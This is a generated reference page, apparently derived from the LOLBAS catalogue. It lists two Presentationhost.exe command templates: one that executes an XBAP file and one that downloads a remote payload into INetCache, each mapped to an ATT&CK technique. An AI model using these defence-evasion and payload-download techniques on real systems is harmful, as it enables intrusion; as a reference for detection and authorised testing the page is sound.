---
parsed_by: focuslocust
source: commands
type: generated
---
# Presentationhost Commands

[Home](../../../README.md)

> This page contains security testing commands. Use only in authorised environments.

## Presentationhost.exe

Tool page: [Presentationhost.exe](../../tools/windows/presentationhost.exe.md)

### Execute code within XBAP files

```text
Presentationhost.exe {PATH_ABSOLUTE:.xbap}
```

Description:

Executes the target XAML Browser Application (XBAP) file

Related ATT&CK:

- [T1218](../../attack/techniques/T1218-system-binary-proxy-execution.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/Presentationhost.yml` |
| Evidence | Command preserved from source parser. |

### Downloads payload from remote server

```text
Presentationhost.exe {REMOTEURL}
```

Description:

It will download a remote payload and place it in INetCache.

Related ATT&CK:

- [T1105](../../attack/techniques/T1105-ingress-tool-transfer.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/Presentationhost.yml` |
| Evidence | Command preserved from source parser. |
